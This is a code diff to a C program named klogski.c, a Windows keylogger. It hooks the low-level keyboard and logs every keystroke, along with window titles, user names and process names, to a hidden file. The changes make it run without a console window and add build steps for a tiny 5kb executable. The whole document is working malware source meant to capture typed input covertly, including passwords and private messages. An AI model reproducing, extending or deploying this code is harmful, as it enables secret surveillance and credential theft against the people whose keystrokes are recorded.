@@ -29,6 +29,22 @@
   ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
   POSSIBILITY OF SUCH DAMAGE. */
 
+/**
+
+To compile this, you can use msvc or gcc
+
+  gcc klogski.c -lshlwapi -oklogski
+  cl klogski.c 
+  
+To create a smaller exe file around 5kb, compile with clib.c but this requires longer command
+
+  cl klogski.c /nologo /c /O2 /Os /GS- /Oi-
+  cl clib.c /nologo /c /O2 /Os /GS- /Oi-
+  link /nologo /NODEFAULTLIB /SUBSYSTEM:WINDOWS /MERGE:.rdata=.text klogski.obj clib.obj Shlwapi.lib user32.lib kernel32.lib advapi32.lib
+  
+  author: odzhan
+  
+*/
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -36,15 +52,17 @@
 #include <windows.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
+#include <Shlwapi.h>
 
 #if !defined (__GNUC__)
 #pragma comment (lib, "advapi32.lib")
+#pragma comment (lib, "shlwapi.lib")
 #endif
 
-HHOOK hHook;
-FILE  *fd;
-HWND  hWindow;
-DWORD pid;
+HHOOK  hHook;
+HWND   hWindow;
+DWORD  pid;
+HANDLE hFile;
 
 // allocate memory
 void *xmalloc (SIZE_T dwSize) {
@@ -54,6 +72,42 @@ void *xmalloc (SIZE_T dwSize) {
 // free memory
 void xfree (void *mem) {
   HeapFree (GetProcessHeap(), 0, mem);
+}
+
+void log_txt (char *fmt, ...) 
+/**
+ * PURPOSE : Display windows error
+ *
+ * RETURN :  Nothing
+ *
+ * NOTES :   None
+ *
+ *F*/
+{
+  char    *error=NULL;
+  va_list arglist;
+  char    buffer[2048];
+  DWORD   wd;
+  
+  va_start (arglist, fmt);
+  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
+  va_end (arglist);
+  
+  WriteFile (hFile, buffer, lstrlen(buffer), &wd, 0);
+}
+
+// open or create log
+BOOL log_open (char s[])
+{
+  hFile=CreateFile (s, FILE_APPEND_DATA, 0, NULL, 
+    OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+  
+  return hFile!=INVALID_HANDLE_VALUE;
+}
+
+void log_close (void)
+{
+  CloseHandle (hFile);
 }
 
 DWORD pid2name (char pname[]) 
@@ -155,9 +209,8 @@ void log_exe(void)
         uid=uname;
         
         CloseHandle (hProc);
-      }  
-      fprintf (fd, "\nUser: %s\\%s Process: %s\n", dom, uid, pname);
-      fflush (fd);
+      }
+      log_txt("  [ User: %s\\%s Process: %s\n", dom, uid, pname);
     }
   }
 }
@@ -169,8 +222,7 @@ void log_wnd(void)
   hWindow=GetForegroundWindow();
   
   GetWindowText (hWindow, txt, sizeof (txt));
-  fprintf (fd, txt);
-  fflush (fd);
+  log_txt ("  [ Window Text: %s\n", txt);
 }
 
 // obtain and log current time/date
@@ -187,8 +239,7 @@ void log_time (char s[])
   GetTimeFormat (LOCALE_SYSTEM_DEFAULT, 0, 
     &st, "HH:mm:ss tt", time, sizeof(time));
   
-  fprintf (fd, "\nLog %s at %s, %s\n", s, date, time);
-  fflush (fd);
+  log_txt("\n  [ Log %s on %s at %s\n", s, date, time);
 }
 
 // log time, module and window info
@@ -208,16 +259,19 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
   for (;;)
   {
     // ignore key releases
-    if (wParam==WM_SYSKEYUP || wParam==WM_KEYUP || wParam==WM_SYSKEYUP) break;
+    if (wParam==WM_SYSKEYUP || 
+        wParam==WM_KEYUP    || 
+        wParam==WM_SYSKEYUP) break;
     
     // ignore left or right shift and capslock
     if (hs->vkCode==VK_LSHIFT ||
         hs->vkCode==VK_RSHIFT ||
         hs->vkCode==VK_CAPITAL) break;
         
-    // check if window changed
+    // log if window changed
     if (GetForegroundWindow()!=hWindow) {
       log_wnd();
+      // log if process changed
       log_exe();
     }
     
@@ -241,34 +295,48 @@ LRESULT CALLBACK LowLevelKeyboardProc (int nCode, WPARAM wParam, LPARAM lParam)
     }
     // replace carriage return with new line
     if (key[0]=='\r') key[0]='\n';
-    fprintf (fd, "%s", key);
-    fflush (fd);
+    log_txt ("%s", key);
     break;
   }
   return CallNextHookEx (hHook, nCode, wParam, lParam);
 }
 
-int main (void)
+int WinMain(HINSTANCE hInstance, 
+  HINSTANCE hPrevInstance, 
+  LPSTR lpCmdLine, 
+  int nCmdShow)
 {
   MSG msg;
-  HMODULE hInstance=GetModuleHandle(NULL);
+  //HMODULE hInstance=GetModuleHandle(NULL);
+  UINT id=GetTickCount();
+  
+  // register hotkey to terminate
+  if (!RegisterHotKey (NULL, id, 
+    MOD_ALT | MOD_CONTROL | MOD_NOREPEAT, VK_F12))
+    return 0;
   
   // create / append to log in current directory
-  fd=fopen ("klog.txt", "a");
-  if (fd!=NULL)
+  // if this fails, it means the log is already opened
+  // and we presume another instance already running
+  if (log_open("klog.txt"))
   {
     // log the date, system name, user name
     log_info("starting");
     // install hook
-    hHook=SetWindowsHookEx (WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
+    hHook=SetWindowsHookEx (WH_KEYBOARD_LL, 
+      LowLevelKeyboardProc, hInstance, 0);
     // loop
     GetMessage (&msg, NULL, 0, 0);
+    if (msg.message == WM_HOTKEY) {
+      log_txt ("\n  [ Hotkey entered\n");
+    }
     // log the time
     log_time("ending");
     // close log
-    fclose (fd);
+    log_close();
     // remove hook
     UnhookWindowsHookEx (hHook); 
   }
+  UnregisterHotKey (NULL, id);
   return 0;
 }
